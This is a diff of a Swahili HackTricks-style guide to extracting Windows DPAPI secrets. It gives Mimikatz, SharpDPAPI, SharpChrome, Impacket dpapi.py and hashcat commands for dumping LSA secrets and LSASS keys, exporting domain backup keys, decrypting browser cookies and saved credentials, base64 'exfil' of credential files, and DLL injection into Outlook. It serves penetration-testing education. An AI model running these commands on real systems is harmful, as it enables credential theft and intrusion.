@@ -1,4 +1,4 @@
-# DPAPI - Kutoa Nenosiri
+# DPAPI - Kutoa Nywila
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,33 +6,33 @@
 
 ## DPAPI ni nini
 
-The Data Protection API (DPAPI) hutumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa ajili ya **symmetric encryption of asymmetric private keys**, ikitumia siri za mtumiaji au za mfumo kama chanzo kikubwa cha entropia. Njia hii inarahisisha encryption kwa waendelezaji kwa kuwa inawawezesha kuficha data kwa kutumia funguo inayotokana na siri za kuingia za mtumiaji au, kwa encryption ya mfumo, siri za uthibitishaji wa domain ya mfumo, hivyo kuwafanya waendelezaji wasiogope kusimamia ulinzi wa funguo za encryption wenyewe.
+The Data Protection API (DPAPI) inatumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa ajili ya **symmetric encryption of asymmetric private keys**, ikitumia siri za mtumiaji au mfumo kama chanzo muhimu cha entropy. Mbinu hii inarahisisha encryption kwa watengenezaji kwa kuwawezesha kuficha data kwa kutumia ufunguo uliotokana na siri za kuingia za mtumiaji au, kwa encryption ya mfumo, siri za uthibitisho za domaine za mfumo, hivyo kuondoa hitaji la watengenezaji kusimamia ulinzi wa ufunguo wa encryption wenyewe.
 
-Njia inayotumika zaidi kutumia DPAPI ni kupitia **`CryptProtectData` and `CryptUnprotectData`** functions, ambazo zinawezesha programu kuficha na kufungua data kwa usalama kwa session ya process ambayo imeingia sasa. Hii inamaanisha kuwa data iliyofichwa inaweza kufunguliwa tu na mtumiaji au mfumo ule ule uliyoificha.
+Njia inayotumika zaidi kufikia DPAPI ni kupitia v-functions za **`CryptProtectData` and `CryptUnprotectData`**, ambazo zinawezesha applications kuficha na kufungua data kwa usalama kwa session ya process ambayo iko imeingia sasa. Hii ina maana kwamba data iliyofichwa inaweza kufunguliwa tu na mtumiaji au mfumo ule ule uliouificha.
 
-Zaidi ya hayo, kazi hizi zinakubali pia parameter ya **`entropy`** ambayo itatumika wakati wa encryption na decryption; kwa hivyo, ili kufungua kitu kilichofichwa kwa kutumia parameter hii, lazima utoe thamani ile ile ya entropy iliyotumika wakati wa encryption.
+Zaidi ya hayo, hizi functions zinakubali pia parameter ya **`entropy`** ambayo itatumika wakati wa encryption na decryption, kwa hivyo, ili kufungua kitu kilichofichwa kwa kutumia parameter hii, lazima utoe thamani ile ile ya entropy iliyotumika wakati wa encryption.
 
-### Uundaji wa funguo za watumiaji
+### Uundaji wa ufunguo wa mtumiaji
 
-DPAPI inazalisha funguo ya kipekee (inayoitwa **`pre-key`**) kwa kila mtumiaji kulingana na cheti chake. Kifunguo hiki kinatokana na nenosiri la mtumiaji na mambo mengine; algorithm inategemea aina ya mtumiaji lakini kawaida inatumia SHA1. Kwa mfano, kwa watumiaji wa domain, **inategemea NTLM hash ya mtumiaji**.
+DPAPI inazalisha ufunguo wa kipekee (uitwacho **`pre-key`**) kwa kila mtumiaji kulingana na nyaraka zao za uthibitisho. Ufunguo huu unatokana na password ya mtumiaji na vipengele vingine na algorithm inategemea aina ya mtumiaji lakini mwisho wake huwa SHA1. Kwa mfano, kwa watumiaji wa domaine, **inategemea NTLM hash ya mtumiaji**.
 
-Hii ni ya kuvutia hasa kwa sababu kama mshambuliaji anaweza kupata hash ya nenosiri la mtumiaji, anaweza:
+Hii ni ya kuvutia hasa kwa sababu ikiwa mshambuliaji anaweza kupata hash ya password ya mtumiaji, wanaweza:
 
-- **Kufungua data yoyote iliyofichwa kwa kutumia DPAPI** kwa funguo ya mtumiaji huyo bila hitaji la kuwasiliana na API yoyote
-- Kujaribu **kuvunja nenosiri** offline kwa kujaribu kutengeneza funguo sahihi ya DPAPI
+- **Kufungua (decrypt) data yoyote iliyofichwa kwa kutumia DPAPI** kwa ufunguo wa mtumiaji huyo bila kuhitaji kuwasiliana na API yoyote
+- Kujaribu **kuchoma (crack) password** kwa mtandao wa offline kwa kujaribu kuzalisha ufunguo wa DPAPI sahihi
 
-Zaidi ya hayo, kila mara data inafichwa na mtumiaji kwa kutumia DPAPI, funguo mpya ya **master key** inazalishwa. Funguo hii ya master ndiyo inayotumika kwa kweli kuficha data. Kila master key inaambatanishwa na **GUID** (Kitambulisho Kipekee Duniani) inayoiweka kipekee.
+Zaidi ya hayo, kila mara data inapofichwa na mtumiaji kwa kutumia DPAPI, funguo mpya ya **funguo kuu** inazalishwa. Funguo hii kuu ndiyo inayotumiwa kwa kweli kuficha data. Kila funguo kuu hupewa **GUID** (Globally Unique Identifier) inayouitambulisha.
 
-Master keys zinahifadhiwa katika saraka **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Kitambulisho cha Usalama (Security Identifier) cha mtumiaji huyo. Master key inahifadhiwa ikiwa imefichwa kwa kutumia **`pre-key`** ya mtumiaji na pia kwa kutumia **domain backup key** kwa ajili ya urejeshaji (kwa hivyo funguo ile ile inahifadhiwa imefichwa mara 2 kwa njia mbili tofauti).
+Funguo kuu zinahifadhiwa katika directory ya **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Security Identifier ya mtumiaji huo. Funguo kuu inahifadhiwa ikiwa imefichwa kwa `pre-key` ya mtumiaji na pia na **domain backup key** kwa ajili ya urejeshaji (hivyo ufunguo ule ule unaohifadhiwa umefichwa mara 2 kwa njia 2 tofauti).
 
-Kumbuka kuwa **domain key inayotumika kuficha master key iko kwenye domain controllers na haisogei kamwe**, hivyo ikiwa mshambuliaji ana ufikiaji wa domain controller, anaweza kupata domain backup key na kufungua master keys za watumiaji wote wa domain.
+Kumbuka kwamba **domain key** inayotumika kuficha funguo kuu iko kwenye domain controllers na haibadiliki, hivyo ikiwa mshambuliaji ana ufikiaji wa domain controller, wanaweza kupata domain backup key na kufungua funguo kuu za watumiaji wote kwenye domaine.
 
-Mabaki yaliyofichwa yanaonyesha **GUID ya master key** ambayo ilitumiwa kuficha data ndani ya vichwa vyao.
+Blobs zilizofichwa zinaonyesha **GUID ya funguo kuu** iliyotumika kuficha data ndani ya headers zake.
 
 > [!TIP]
-> DPAPI encrypted blobs huanza na **`01 00 00 00`**
+> DPAPI encrypted blobs starts with **`01 00 00 00`**
 
-Tafuta master keys:
+Pata funguo kuu:
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
@@ -41,47 +41,49 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
+Hivi ndivyo kundi la Master Keys la mtumiaji litakavyoonekana:
+
 ![](<../../images/image (1121).png>)
 
-### Uundaji wa ufunguo wa Mashine/Mfumo
+### Uundaji wa funguo za Mashine/System
 
-Huu ni ufunguo unaotumika na mashine kuficha data. Unatokana na **DPAPI_SYSTEM LSA secret**, ambayo ni ufunguo maalum ambao mtumiaji wa SYSTEM pekee anaweza kufikia. Ufunguo huu unatumiwa kuficha data inayohitajika kufikiwa na mfumo mwenyewe, kama vile sifa za ngazi ya mashine au siri za mfumo mzima.
+Hii ni funguo inayotumika na mashine kuficha (encrypt) data. Inatokana na **DPAPI_SYSTEM LSA secret**, ambayo ni funguo maalum ambayo mtumiaji wa SYSTEM pekee anaweza kufikia. Funguo hii inatumiwa kuficha data inayohitajika kufikiwa na system yenyewe, kama vile cheti za ngazi ya mashine au siri za ngazi ya system.
 
-Kumbuka kwamba funguo hizi **hazina backup ya domain**, hivyo zinapatikana tu kwa ndani ya mashine:
+Kumbuka kuwa funguo hizi **hazina domain backup** hivyo zinapatikana tu ndani ya mashine:
 
-- **Mimikatz** inaweza kuzifikia kwa kutoa LSA secrets kwa kutumia amri: `mimikatz lsadump::secrets`
-- Siri hiyo imehifadhiwa ndani ya registry, hivyo msimamizi anaweza **kubadilisha ruhusa za DACL ili kuzipata**. Njia ya registry ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
-- Utoaji wa nje ya mtandao kutoka registry hives pia unaweza kufanyika. Kwa mfano, kama msimamizi kwenye lengo, hifadhi hives na exfiltrate them:
+- **Mimikatz** inaweza kuzifikia kwa ku-dump LSA secrets kwa kutumia amri: `mimikatz lsadump::secrets`
+- Siri hiyo imehifadhiwa ndani ya registry, hivyo msimamizi anaweza **kubadilisha ruhusa za DACL ili kuifikia**. Njia ya registry ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
+- Utoaji wa offline kutoka registry hives pia unawezekana. Kwa mfano, kama msimamizi kwenye target, hifadhi hives na exfiltrate hizo:
 ```cmd
 reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
 reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
 ```
-Kisha kwenye analysis box yako, rejesha DPAPI_SYSTEM LSA secret kutoka kwenye hives na uitumie ku-decrypt machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, etc.):
+Kisha kwenye kifaa chako cha uchambuzi, pata siri ya DPAPI_SYSTEM LSA kutoka kwa hives na itumie ku-decrypt blobs za kiwango cha mashine (nywila za kazi zilizopangwa, kredenshiali za huduma, profaili za Wi‑Fi, nk):
 ```text
 mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
 # Look for the DPAPI_SYSTEM secret in the output
 ```
-### Protected Data by DPAPI
+### Data zilizolindwa na DPAPI
 
-Miongoni mwa data za kibinafsi zilizolindwa na DPAPI ni:
+Miongoni mwa data binafsi zilizolindwa na DPAPI ni:
 
-- kredensiali za Windows
-- nywila na data za kujaza kiotomatiki za Internet Explorer na Google Chrome
-- nywila za akaunti za barua pepe na FTP za ndani kwa programu kama Outlook na Windows Mail
-- nywila za folda zilizosambazwa, rasilimali, mitandao isiotumia waya, na Windows Vault, pamoja na funguo za usimbaji
-- nywila za muunganisho wa remote desktop, .NET Passport, na funguo binafsi kwa madhumuni mbalimbali ya usimbaji na uthibitisho
-- nywila za mtandao zinazosimamiwa na Credential Manager na data za kibinafsi katika programu zinazotumia CryptProtectData, kama Skype, MSN messenger, na nyinginezo
-- blobs zilizofichwa ndani ya register
+- Windows creds
+- Internet Explorer and Google Chrome's passwords and auto-completion data
+- Nywila za barua pepe na za akaunti za FTP za ndani kwa programu kama Outlook na Windows Mail
+- Nywila za folda zilizoshirikiwa, rasilimali, mitandao isiyo na waya, na Windows Vault, ikijumuisha funguo za usimbaji
+- Nywila za muunganisho wa remote desktop, .NET Passport, na funguo za kibinafsi kwa madhumuni mbalimbali ya usimbaji na uthibitisho
+- Nywila za mtandao zinazosimamiwa na Credential Manager na data binafsi katika programu zinazotumia CryptProtectData, kama Skype, MSN messenger, n.k.
+- Encrypted blobs inside the registry
 - ...
 
-Data za mfumo zilizo lindwa ni pamoja na:
-- nywila za Wifi
-- nywila za kazi zilizopangwa
+System protected data includes:
+- Nywila za Wi‑Fi
+- Nywila za kazi zilizopangwa
 - ...
 
-### Chaguzi za kuchukua master key
+### Chaguo za kunasa master key
 
-- Ikiwa mtumiaji ana ruhusa za domain admin, wanaweza kufikia **domain backup key** ili kufungua (ku-decrypt) master keys zote za watumiaji katika domain:
+- Ikiwa mtumiaji ana haki za domain admin, wanaweza kupata **domain backup key** ili kufungua master keys zote za watumiaji ndani ya domain:
 ```bash
 # Mimikatz
 lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
@@ -89,17 +91,17 @@ lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
 # SharpDPAPI
 SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
 ```
-- With local admin privileges, inawezekana **kupata kumbukumbu ya LSASS** ili kutoa DPAPI master keys za watumiaji wote waliounganishwa na funguo ya SYSTEM.
+- Kwa ruhusa za admin za ndani, inawezekana **kufikia kumbukumbu ya LSASS** ili kutoa funguo kuu za DPAPI za watumiaji wote waliounganishwa pamoja na ufunguo wa SYSTEM.
 ```bash
 # Mimikatz
 mimikatz sekurlsa::dpapi
 ```
-- Ikiwa mtumiaji ana local admin privileges, wanaweza kupata **DPAPI_SYSTEM LSA secret** ili kudekripta vifunguo kuu vya mashine:
+- Ikiwa mtumiaji ana local admin privileges, anaweza kufikia **DPAPI_SYSTEM LSA secret** ili ku-decrypt machine master keys:
 ```bash
 # Mimikatz
 lsadump::secrets /system:DPAPI_SYSTEM /export
 ```
-- Ikiwa password au hash NTLM ya user inajulikana, unaweza **decrypt the master keys of the user directly**:
+- Ikiwa password au hash NTLM ya mtumiaji inajulikana, unaweza **decrypt the master keys of the user directly**:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected
@@ -107,7 +109,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-- Ikiwa uko ndani ya session kama mtumiaji, inawezekana kumuomba DC kwa **backup key to decrypt the master keys using RPC**. Ikiwa wewe ni local admin na mtumiaji ameingia, unaweza **steal his session token** kwa hili:
+- Ikiwa uko ndani ya kikao kama mtumiaji, inawezekana kumuomba DC kwa **backup key to decrypt the master keys using RPC**. Ikiwa wewe ni local admin na mtumiaji ameingia, unaweza **steal his session token** kwa hili:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -115,7 +117,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-## Orodhesha Vault
+## Orodha ya Vault
 ```bash
 # From cmd
 vaultcmd /listcreds:"Windows Credentials" /all
@@ -123,25 +125,25 @@ vaultcmd /listcreds:"Windows Credentials" /all
 # From mimikatz
 mimikatz vault::list
 ```
-## Fikia Data Iliyosimbwa ya DPAPI
+## Kufikia Data Iliyofichwa na DPAPI
 
-### Tafuta data iliyosimbwa ya DPAPI
+### Tafuta Data Iliyofichwa na DPAPI
 
-Faili za watumiaji **zililindwa** kwa kawaida ziko katika:
+Mafaili ya watumiaji **yaliyolindwa** kwa kawaida yamo katika:
 
 - `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
-- Pia angalia kubadilisha `\Roaming\` kuwa `\Local\` katika njia zilizo hapo juu.
+- Angalia pia kubadilisha `\Roaming\` kuwa `\Local\` katika njia zilizo hapo juu.
 
-Mifano ya uorodheshaji:
+Enumeration examples:
 ```bash
 dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata DPAPI encrypted blobs katika file system, registry na B64 blobs:
+[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata blobs zilizosimbwa kwa DPAPI kwenye mfumo wa faili, registry na blobs za B64:
 ```bash
 # Search blobs in the registry
 search /type:registry [/path:HKLM] # Search complete registry by default
@@ -156,39 +158,39 @@ search /type:file /path:C:\path\to\file
 # Search a blob inside B64 encoded data
 search /type:base64 [/base:<base64 string>]
 ```
-Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka kwenye repo ile ile) inaweza kutumika kufungua kwa DPAPI data nyeti kama cookies.
+Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka kwenye repo ileile) inaweza kutumika ku-decrypt data nyeti kwa kutumia DPAPI, kama cookies.
 
-#### Chromium/Edge/Electron mapishi ya haraka (SharpChrome)
+#### Chromium/Edge/Electron mbinu za haraka (SharpChrome)
 
-- Mtumiaji wa sasa, interactive decryption ya saved logins/cookies (inafanya kazi hata na Chrome 127+ app-bound cookies kwa sababu ufunguo wa ziada hutatuliwa kutoka kwa user’s Credential Manager wakati inapoendesha katika user context):
+- Current user, interactive decryption of saved logins/cookies (inafanya kazi hata na Chrome 127+ app-bound cookies kwa sababu funguo ya ziada inapotatuliwa kutoka kwa Credential Manager ya mtumiaji wakati inapoendeshwa katika muktadha wa mtumiaji):
 ```cmd
 SharpChrome logins  /browser:edge  /unprotect
 SharpChrome cookies /browser:chrome /format:csv /unprotect
 ```
-- Uchambuzi wa offline wakati una faili tu. Kwanza toa ufunguo wa AES state kutoka kwenye profaili "Local State" kisha utumie ku-decrypt cookie DB:
+- Uchambuzi wa offline wakati una faili tu. Kwanza extract AES state key kutoka kwenye profile’s "Local State" kisha itumie ku-decrypt cookie DB:
 ```cmd
 # Dump the AES state key from Local State (DPAPI will be used if running as the user)
 SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
 # Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
 SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
 ```
-- Uchambuzi wa domain-wide/remote wakati una DPAPI domain backup key (PVK) na admin kwenye target host:
+- Triage ya Domain-wide/remote wakati una DPAPI domain backup key (PVK) na admin kwenye target host:
 ```cmd
 SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
 SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
 ```
-- Ikiwa una DPAPI prekey/credkey ya mtumiaji (kutoka LSASS), unaweza kuruka password cracking na moja kwa moja decrypt data za wasifu:
+- Ikiwa una DPAPI prekey/credkey ya mtumiaji (kutoka LSASS), unaweza kuruka password cracking na moja kwa moja ku-decrypt data za profaili:
 ```cmd
 # For SharpChrome use /prekey; for SharpDPAPI use /credkey
 SharpChrome cookies /browser:edge /prekey:SHA1_HEX
 SharpDPAPI.exe credentials /credkey:SHA1_HEX
 ```
-Notes
-- Matoleo mapya ya Chrome/Edge yanaweza kuhifadhi cookies fulani kwa kutumia usimbaji "App-Bound". Ku-decrypt nje ya mtandao kwa cookies hizo maalum haiwezekani bila app-bound key ya ziada; endesha SharpChrome katika target user context ili kuipata kiotomatiki. Tazama chapisho la blogi ya usalama la Chrome lililotajwa hapa chini.
+Vidokezo
+- Mijengo mipya ya Chrome/Edge inaweza kuhifadhi cookies fulani kwa kutumia "App-Bound" encryption. Offline decryption ya cookies hizo maalum haiwezekani bila app-bound key ya ziada; endesha SharpChrome chini ya muktadha wa mtumiaji lengwa ili kuipata moja kwa moja. Angalia chapisho la blogu la usalama la Chrome lililotajwa hapa chini.
 
 ### Funguo za ufikiaji na data
 
-- **Tumia SharpDPAPI** ili kupata credentials kutoka kwa faili zilizosimbwa na DPAPI kutoka kwenye current session:
+- **Tumia SharpDPAPI** kupata credentials kutoka kwa DPAPI encrypted files kutoka kwa session ya sasa:
 ```bash
 # Decrypt user data
 ## Note that 'triage' is like running credentials, vaults, rdg and certificates
@@ -207,9 +209,9 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-- **Pata masterkeys**:
+- **Access masterkeys**:
 
-Dekripta masterkey ya mtumiaji aliyeomba **domain backup key** kwa kutumia RPC:
+Fungua masterkey ya mtumiaji aliyeomba **domain backup key** kwa kutumia RPC:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -217,7 +219,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-Zana ya **SharpDPAPI** pia inaunga mkono vigezo hivi kwa ajili ya kufungua masterkey (kumbuka jinsi inavyowezekana kutumia `/rpc` kupata funguo ya backup ya domain, `/password` kutumia nenosiri wazi, au `/pvk` kutaja faili ya funguo binafsi ya DPAPI...):
+Zana ya **SharpDPAPI** pia inasaidia vigezo hivi kwa ajili ya kuvunjwa kwa masterkey (kumbuka jinsi inavyowezekana kutumia `/rpc` kupata ufunguo wa chelezo wa domain, `/password` kutumia nenosiri wazi, au `/pvk` kubainisha faili ya ufunguo binafsi wa DPAPI domain...):
 ```
 /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
 /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
@@ -229,7 +231,7 @@ Zana ya **SharpDPAPI** pia inaunga mkono vigezo hivi kwa ajili ya kufungua maste
 /server:SERVER          -   triage a remote server, assuming admin access
 /hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
 ```
-- **Decrypt data kwa kutumia masterkey**:
+- **Fungua data iliyosimbwa kwa kutumia masterkey**:
 ```bash
 # Mimikatz
 dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
@@ -237,7 +239,7 @@ dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 # SharpDPAPI
 SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
 ```
-Zana ya **SharpDPAPI** pia inasaidia hoja hizi kwa ajili ya `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (angalia jinsi inavyowezekana kutumia `/rpc` kupata domains backup key, `/password` kutumia plaintext password, `/pvk` kubainisha DPAPI domain private key file, `/unprotect` kutumia current users session...):
+Zana ya **SharpDPAPI** pia inaunga mkono vigezo hivi kwa ajili ya `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (angalia jinsi inavyowezekana kutumia `/rpc` kupata domains backup key, `/password` kutumia plaintext password, `/pvk` kubainisha DPAPI domain private key file, `/unprotect` kutumia current users session...):
 ```
 Decryption:
 /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
@@ -256,9 +258,9 @@ Targeting:
 Note: must use with /pvk:KEY or /password:X
 Note: not applicable to 'blob' or 'ps' commands
 ```
-- Kutumia DPAPI prekey/credkey moja kwa moja (hakuna password inahitajika)
+- Kutumia DPAPI prekey/credkey moja kwa moja (no password needed)
 
-Ikiwa unaweza dump LSASS, Mimikatz mara nyingi hutoa per-logon DPAPI key inayoweza kutumika ku-decrypt masterkeys za mtumiaji bila kujua plaintext password. Tumia thamani hii moja kwa moja kwenye tooling:
+Ikiwa unaweza dump LSASS, Mimikatz mara nyingi huonyesha per-logon DPAPI key inayoweza kutumika ku-decrypt masterkeys za mtumiaji bila kujua plaintext password. Pitisha thamani hii moja kwa moja kwa tooling:
 ```cmd
 # SharpDPAPI accepts the "credkey" (domain or local SHA1)
 SharpDPAPI.exe triage /credkey:SHA1_HEX
@@ -266,7 +268,7 @@ SharpDPAPI.exe triage /credkey:SHA1_HEX
 # SharpChrome accepts the same value as a "prekey"
 SharpChrome logins /browser:edge /prekey:SHA1_HEX
 ```
-- Dekripti baadhi ya data ukitumia **kikao cha mtumiaji wa sasa**:
+- Fungua baadhi ya data zilizosimbwa kwa kutumia **kikao cha mtumiaji wa sasa**:
 ```bash
 # Mimikatz
 dpapi::blob /in:C:\path\to\encrypted\file /unprotect
@@ -276,21 +278,21 @@ SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 ```
 ---
 
-### Dekripsi ya nje (offline) kwa kutumia Impacket dpapi.py
+### Dekripsheni bila mtandao kwa Impacket dpapi.py
 
-Iwapo una SID ya mtumiaji wa mwathiriwa na nenosiri (au NT hash), unaweza ku-decrypt DPAPI masterkeys na Credential Manager blobs kabisa bila mtandao kwa kutumia Impacket dpapi.py.
+Kama una SID ya mtumiaji wa mwathirika na nywila (au NT hash), unaweza ku-decrypt DPAPI masterkeys na Credential Manager blobs kabisa bila mtandao ukitumia Impacket’s dpapi.py.
 
-- Tambua faili muhimu kwenye diski:
+- Tambua artefacts kwenye diski:
 - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
-- Masterkey inayolingana: %APPDATA%\Microsoft\Protect\<SID>\{GUID}
+- masterkey inayolingana: %APPDATA%\Microsoft\Protect\<SID>\{GUID}
 
-- Ikiwa zana za kuhamisha faili hazifanyi kazi vizuri, fanya base64 kwa faili kwenye mwenyeji (on-host) kisha nakili matokeo:
+- Ikiwa zana za kuhamisha faili hazitegemewe, base64 faili hizo kwenye mashine mwenyeji na nakili matokeo:
 ```powershell
 # Base64-encode files for copy/paste exfil
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
 ```
-- Ondoa usimbaji wa masterkey kwa kutumia SID ya mtumiaji na password/hash:
+- Dekripti masterkey kwa kutumia SID ya mtumiaji na password/hash:
 ```bash
 # Plaintext password
 python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
@@ -306,15 +308,15 @@ python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTE
 # Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
 # Username=<user> ; Password=<cleartext>
 ```
-Mchakato huu mara nyingi hurudisha domain credentials zilizohifadhiwa na apps zinazotumia Windows Credential Manager, ikiwa ni pamoja na akaunti za kiutawala (mf., `*_adm`).
+Mtiririko huu mara nyingi hurudisha cheti za domain zilizohifadhiwa na programu zinazotumia Windows Credential Manager, ikiwa ni pamoja na akaunti za kiutawala (mfano, `*_adm`).
 
 ---
 
 ### Kushughulikia Entropy ya Hiari ("Third-party entropy")
 
-Baadhi ya applications hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii blob haiwezi kufunguliwa (decrypted), hata kama masterkey sahihi inajulikana. Kupata entropy ni muhimu kwa hivyo unapolenga credentials zilizolindwa kwa njia hii (mf., Microsoft Outlook, baadhi ya VPN clients).
+Baadhi ya programu hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii blob haiwezi kufunguliwa, hata kama masterkey sahihi inajulikana. Kupata entropy ni muhimu wakati wa kulenga cheti zilizolindwa kwa njia hii (kwa mfano Microsoft Outlook, baadhi ya VPN clients).
 
-[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni user-mode DLL inayohook DPAPI functions ndani ya target process na inarekodi kwa uwazi entropy yoyote ya hiari inayotolewa. Kukimbiza EntropyCapture katika mode ya **DLL-injection** dhidi ya processes kama `outlook.exe` au `vpnclient.exe` itatoa faili inayoonyesha mechi ya kila entropy buffer na process inayoiita pamoja na blob. Entropy iliyorekodiwa inaweza kisha kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili kufungua data.
+[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni DLL ya user-mode ambayo ina-hook DPAPI functions ndani ya mchakato lengwa na kwa uwazi inarekodi entropy ya hiari yoyote inayotolewa. Kuendesha EntropyCapture katika mode ya **DLL-injection** dhidi ya mchakato kama `outlook.exe` au `vpnclient.exe` kutaweka faili inayompa ramani kila buffer ya entropy kwa mchakato uliouita pamoja na blob. Entropy iliyorekodiwa baadaye inaweza kutumwa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili kufungua data.
 ```powershell
 # Inject EntropyCapture into the current user's Outlook
 InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
@@ -324,70 +326,70 @@ SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
 ```
 ### Cracking masterkeys offline (Hashcat & DPAPISnoop)
 
-Microsoft ilitambulisha muundo wa **context 3** masterkey kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desemba 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) na **22102** (context 3), ikiruhusu GPU-accelerated cracking ya user passwords moja kwa moja kutoka kwa masterkey file. Wavamizi kwa hivyo wanaweza kufanya word-list au brute-force attacks bila kuingiliana na mfumo lengwa.
+Microsoft ilianzisha muundo wa masterkey **context 3** kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) na **22102** (context 3) zikioruhusu GPU-accelerated cracking ya nywila za watumiaji moja kwa moja kutoka kwenye faili ya masterkey. Wavamizi wanaweza kwa hivyo kufanya word-list or brute-force attacks bila kuingiliana na mfumo lengwa.
 
-`DPAPISnoop` (2024) hufanya mchakato huo kiotomatiki:
+`DPAPISnoop` (2024) inaotomatiza mchakato:
 ```bash
 # Parse a whole Protect folder, generate hashcat format and crack
 DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
 hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
-Zana pia inaweza kuchambua blobs za Credential na Vault, ku-decrypt kwa kutumia cracked keys na ku-export cleartext passwords.
+Zana pia inaweza kuchambua Credential na Vault blobs, ku-decrypt kwa cracked keys na ku-export cleartext passwords.
 
 ### Kufikia data za mashine nyingine
 
